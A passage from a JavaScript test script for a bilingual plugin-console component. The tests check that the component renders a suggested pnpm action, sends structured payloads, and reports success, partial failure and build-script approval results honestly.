      actionAllowLabel: '允许这些构建脚本', actionAllowOk: '已写入放行项', actionAllowFailed: '放行失败（文件未改动）', actionAllowBackup: '备份',
      actionAllowLong: '只有你点它才会写盘：把具体包名补进 allowBuilds（改前备份、写完读回核实）；它本身不下载、不执行任何脚本。',
    }
    return dict[key] ?? key
  }
  const en = (key) => {
    const dict = {
      actionBoxTitle: 'Suggested action', actionPinLabel: 'Pin this dependency (record as link:)', actionReconcileLabel: 'Rebuild pnpm-lock.yaml',
      actionRun: 'Run', actionCopy: 'Copy', actionCopied: 'Command copied', actionRunning: 'Running…',
      actionOk: 'Done', actionPartial: 'Partly done (manifest updated, lock not aligned)', actionFailed: 'Failed',
      actionLongTitle: 'The console runs a whitelisted action inside its own process', closeModal: 'Close',
      actionAllowLabel: 'Allow these build scripts', actionAllowOk: 'Approval written', actionAllowFailed: 'Approval failed (file untouched)', actionAllowBackup: 'Backup',
      actionAllowLong: 'Nothing is written until you click: it adds the exact package names to allowBuilds (backup + read-back verify); it downloads and runs nothing itself.',
    }
    return dict[key] ?? key
  }
  const payload = { action: 'pin-dependency', packageName: '@fake/demo', version: '1.0.0', profile: 'web' }
  const action = { kind: 'pin-dependency', label: '钉住该依赖（按 link: 记录）', command: 'pnpm add link:C:/Users/x/.dsh/plugin-src/@fake/demo --registry https://registry.npmmirror.com', payload }

  // ① 无 suggestedAction → 不渲染（不占版面）
  const none = renderJob({ jobId: 'j0', status: 'done', packageName: '@fake/demo', suggestedAction: null }, zh)
  check('★ 渲染断言：作业里没有 suggestedAction → 组件返回 null（不占版面）', none.tree[0] === null, String(none.view().texts.join('|')))

  // ② 有 suggestedAction → 短说明 + 等宽只读命令 + 「执行」「复制」
  const view = renderJob({ jobId: 'j1', status: 'done', packageName: '@fake/demo', suggestedAction: action }, zh)
  const flat = view.view()
  check('★ 渲染断言：有 suggestedAction → 出现标题/短说明 + 两个按钮（执行 / 复制）+ 等宽命令',
    flat.texts.includes('建议动作') && flat.texts.includes('钉住该依赖（按 link: 记录）') && flat.buttons.includes('执行') && flat.buttons.includes('复制')
    && flat.codes.includes(action.command), JSON.stringify({ buttons: flat.buttons, codes: flat.codes }))
  check('★ 渲染断言：命令是只读展示（code 元素，不是输入框），长解释挂 title 而不是铺在面板上',
    flat.nodes.some((n) => n.tag === 'code') && !flat.nodes.some((n) => n.tag === 'input')
    && flat.nodes.some((n) => typeof n.title === 'string' && n.title.includes('白名单')), JSON.stringify(flat.nodes.map((n) => n.tag)))

  // ③ 中英切换：同一份数据换字典 → 按钮文案跟着变
  const enView = renderJob({ jobId: 'j2', status: 'done', packageName: '@fake/demo', suggestedAction: action }, en).view()
  check('★ 渲染断言：中英切换（同一 action，同一棵结构，按钮文案跟随字典）',
    enView.texts.includes('Suggested action') && enView.buttons.includes('Run') && enView.buttons.includes('Copy')
    && enView.texts.includes('Pin this dependency (record as link:)'), JSON.stringify(enView.buttons))

  // ④ 执行中 → 按钮禁用 + 文案变「执行中…」（点一次只发一次请求）
  let fetchCalls = 0
  let resolveFetch = null
  const fetchLog = []
  globalThis.fetch = (path, options) => {
    fetchCalls += 1
    fetchLog.push({ path, body: options?.body === undefined ? null : JSON.parse(options.body) })
    return new Promise((resolve) => { resolveFetch = () => resolve({ ok: true, status: 200, json: async () => ({ ok: true, reason: '已钉住' }) }) })
  }
  const running = renderJob({ jobId: 'j3', status: 'done', packageName: '@fake/demo', suggestedAction: action }, zh)
  buttonByText(running.view(), '执行').onClick()
  running.calls()
  const runningFlat = running.view()
  check('★ 渲染断言：执行中 → 出现「执行中…」且执行按钮被禁用（防重复点击）',
    runningFlat.texts.includes('执行中…') && runningFlat.nodes.some((n) => n.tag === 'button' && n.disabled === true && n.props?.children === '执行中…'),
    JSON.stringify({ texts: runningFlat.texts, disabled: runningFlat.nodes.filter((n) => n.disabled).length }))
  check('★ 渲染断言：点「执行」发的是**结构化动作**（POST /plugin-console/run-suggested + payload），不带任何命令字符串',
    fetchCalls === 1 && fetchLog.length === 1 && fetchLog[0].path === '/plugin-console/run-suggested'
    && JSON.stringify(fetchLog[0].body) === JSON.stringify(payload), JSON.stringify(fetchLog))
  await new Promise((r) => { resolveFetch(); setTimeout(r, 0) })
  await new Promise((r) => setTimeout(r, 0))
  running.calls()
  const doneFlat = running.view()
  check('★ 渲染断言：成功 → 回显「执行成功」+ 服务端 reason',
    doneFlat.texts.some((s) => s.includes('执行成功')) && doneFlat.texts.some((s) => s.includes('已钉住')), JSON.stringify(doneFlat.texts))

  // ⑤ 失败 → 错误回显 + 可关闭
  globalThis.fetch = () => Promise.resolve({ ok: true, status: 200, json: async () => ({ ok: false, partial: true, exitCode: 1, reason: '清单已钉住，lock 未对齐', stderr: 'ERR_PNPM_X boom\n' }) })
  const failedView = renderJob({ jobId: 'j4', status: 'done', packageName: '@fake/demo', suggestedAction: action }, zh)
  buttonByText(failedView.view(), '执行').onClick()
  await new Promise((r) => setTimeout(r, 0))
  await new Promise((r) => setTimeout(r, 0))
  failedView.calls()
  const fFlat = failedView.view()
  check('★ 渲染断言：失败/部分成功 → 如实回显（"部分成功…" + reason + stderr 末行），不是"成功"',
    fFlat.texts.some((s) => s.includes('部分成功')) && fFlat.texts.some((s) => s.includes('清单已钉住，lock 未对齐'))
    && !fFlat.texts.includes('执行成功'), JSON.stringify(fFlat.texts))
  const closeBtn = fFlat.nodes.find((n) => n.tag === 'button' && n.props?.['aria-label'] === '关闭')
  check('★ 渲染断言：可关闭（✕ 按钮存在且带 aria-label）', closeBtn !== undefined)
  closeBtn.onClick()
  failedView.calls()
  check('★ 渲染断言：关闭后整块消失（返回 null）', failedView.tree[0] === null)

  // ⑥ 复制按钮（navigator 是全局 getter：用 defineProperty 覆盖成 stub；覆盖不了就响亮跳过）
  let copied = null
  let clipboardReady = true
  try {
    Object.defineProperty(globalThis, 'navigator', { value: { clipboard: { writeText: (text) => { copied = text; return Promise.resolve() } } }, configurable: true })
  } catch (error) {
    clipboardReady = false
    console.log(`SKIP 复制按钮断言 —— 本 Node 无法替换 globalThis.navigator：${String(error?.message ?? error).slice(0, 80)}`)
  }
  const copyView = renderJob({ jobId: 'j5', status: 'done', packageName: '@fake/demo', suggestedAction: action }, zh)
  buttonByText(copyView.view(), '复制').onClick()
  copyView.calls()
  if (clipboardReady) {
    check('★ 渲染断言：点「复制」复制的是**展示用命令**（只读字符串，不参与执行）',
      copied === action.command && copyView.view().texts.includes('已复制命令'), String(copied))
  }

  // ⑦ 选项 2：执行结果说明"pnpm 因构建脚本未获批准而报错"时，动作框多出第二个动作按钮
  const ignoredNotes = ['依赖已钉住（清单+lock 已就位）；pnpm 因构建脚本未获批准而报错 —— 这不会执行任何脚本，也不影响加载；如需放行请点「允许这些构建脚本」']
  const nextAction = { kind: 'allow-builds', label: '允许这些构建脚本', command: 'pnpm approve-builds', payload: { action: 'allow-builds', profile: 'web' } }
  let pinResponse = {
    ok: true, kind: 'ignored-builds', exitCode: 1, notes: ignoredNotes,
    reason: '@fake/demo 已钉住：清单与 pnpm-lock.yaml 都指向 link:…',
    ignoredBuilds: ['cloudflared', 'cpu-features', 'ssh2'], nextAction,
  }
  let allowResponse = {
    ok: true, action: 'allow-builds', changed: true, added: ['cloudflared', 'cpu-features', 'ssh2'],
    file: 'C:/Users/x/.dsh/profiles/web/pnpm-workspace.yaml', sha256Before: 'aaaabbbbcccc', sha256After: 'ddddeeeeffff',
    backup: 'C:/Users/x/.dsh/profiles/web/pnpm-workspace.yaml.bak-2026-09-27T16-12-33-123Z',
    notes: ['已把 3 个包写进 pnpm-workspace.yaml 的 allowBuilds（只加/改这几行，其它字段一字未动）。'],
    reason: '已放行：cloudflared、cpu-features、ssh2',
  }
  const allowLog = []
  globalThis.fetch = (path, options) => {
    fetchCalls += 1
    const body = options?.body === undefined ? null : JSON.parse(options.body)
    fetchLog.push({ path, body })
    if (body?.action === 'allow-builds') {
      allowLog.push(body)
      return Promise.resolve({ ok: true, status: 200, json: async () => allowResponse })
    }
    return Promise.resolve({ ok: true, status: 200, json: async () => pinResponse })
  }
  // ⑦a 还没执行 → 一个像素都不多占（没有这个按钮）
  const beforeRun = renderJob({ jobId: 'j6', status: 'done', packageName: '@fake/demo', suggestedAction: action }, zh)
  check('★ 渲染断言：还没执行前不出现「允许这些构建脚本」（该场景才知道要放行）',
    !beforeRun.view().buttons.includes('允许这些构建脚本') && !beforeRun.view().buttons.includes('Allow these build scripts'),
    JSON.stringify(beforeRun.view().buttons))
  // ⑦b 执行后拿到 ignored-builds 结果 → 出现按钮（中英各一份 + 悬浮长解释）
  buttonByText(beforeRun.view(), '执行').onClick()
  await new Promise((r) => setTimeout(r, 0))
  await new Promise((r) => setTimeout(r, 0))
  beforeRun.calls()
  const ignoredFlat = beforeRun.view()
  const allowBtn = buttonByText(ignoredFlat, '允许这些构建脚本')
  check('★ 渲染断言：ignored-builds 结果 → 出现「允许这些构建脚本」按钮，且服务端 note 原样回显',
    allowBtn !== undefined && ignoredFlat.texts.some((s) => s.includes('构建脚本未获批准')),
    JSON.stringify({ buttons: ignoredFlat.buttons, texts: ignoredFlat.texts }))
  check('★ 渲染断言：长解释挂在悬浮 title 上（含"不下载、不执行任何脚本"），正文只放短句',
    typeof allowBtn?.title === 'string' && allowBtn.title.includes('不下载、不执行任何脚本')
    && !ignoredFlat.texts.some((s) => s.includes('不下载、不执行任何脚本')), String(allowBtn?.title).slice(0, 60))
  // ⑦c 点它 → 发的是结构化 payload（不是命令字符串）
  allowBtn.onClick()
  beforeRun.calls()
  check('★ 渲染断言：点放行按钮发的是 nextAction.payload（{action:"allow-builds"}），不带任何命令字符串',
    JSON.stringify(allowLog) === JSON.stringify([nextAction.payload]), JSON.stringify(allowLog))
  check('★ 渲染断言：执行中按钮禁用（防连点）',
    beforeRun.view().nodes.some((n) => n.tag === 'button' && n.disabled === true && n.props?.children === '执行中…'),
    JSON.stringify(beforeRun.view().buttons))
  await new Promise((r) => setTimeout(r, 0))
  await new Promise((r) => setTimeout(r, 0))
  beforeRun.calls()
  const allowedFlat = beforeRun.view()
  check('★ 渲染断言：放行成功 → 回显「已写入放行项」+ 原因，按钮收起（不会再点第二次）',
    allowedFlat.texts.some((s) => s.includes('已写入放行项')) && !allowedFlat.buttons.includes('允许这些构建脚本')
    && allowedFlat.nodes.some((n) => typeof n.title === 'string' && n.title.includes('sha256') && n.title.includes('备份')),
    JSON.stringify({ texts: allowedFlat.texts, buttons: allowedFlat.buttons }))
  // ⑦d 英文界面：同一份数据换字典 → 按钮文案跟随
  const enIgnored = renderJob({ jobId: 'j7', status: 'done', packageName: '@fake/demo', suggestedAction: action }, en)
  buttonByText(enIgnored.view(), 'Run').onClick()
  await new Promise((r) => setTimeout(r, 0))
  await new Promise((r) => setTimeout(r, 0))
  enIgnored.calls()
  check('★ 渲染断言：中英切换（Allow these build scripts）',
    enIgnored.view().buttons.includes('Allow these build scripts'), JSON.stringify(enIgnored.view().buttons))
  // ⑦e 放行失败 → 如实回显（不假装成功）
  allowResponse = { ok: false, action: 'allow-builds', changed: false, reason: 'ssh2 不在当前被忽略的构建脚本名单里，拒绝改写' }
  const allowFail = renderJob({ jobId: 'j8', status: 'done', packageName: '@fake/demo', suggestedAction: action }, zh)
  buttonByText(allowFail.view(), '执行').onClick()
  await new Promise((r) => setTimeout(r, 0))
  await new Promise((r) => setTimeout(r, 0))
  allowFail.calls()
  buttonByText(allowFail.view(), '允许这些构建脚本').onClick()
  await new Promise((r) => setTimeout(r, 0))
  await new Promise((r) => setTimeout(r, 0))
  allowFail.calls()
  const failFlat = allowFail.view()
  check('★ 渲染断言：放行失败 → 回显「放行失败（文件未改动）」+ 服务端 reason（不是"成功"）',
    failFlat.texts.some((s) => s.includes('放行失败（文件未改动）')) && failFlat.texts.some((s) => s.includes('拒绝改写'))
    && !failFlat.texts.some((s) => s.includes('已写入放行项')), JSON.stringify(failFlat.texts))
}

rmSync(HOME, { recursive: true, force: true })
console.log(failed === 0 ? '\nALL PASS' : `\n${failed} FAILED`)
process.exit(failed === 0 ? 0 : 1)
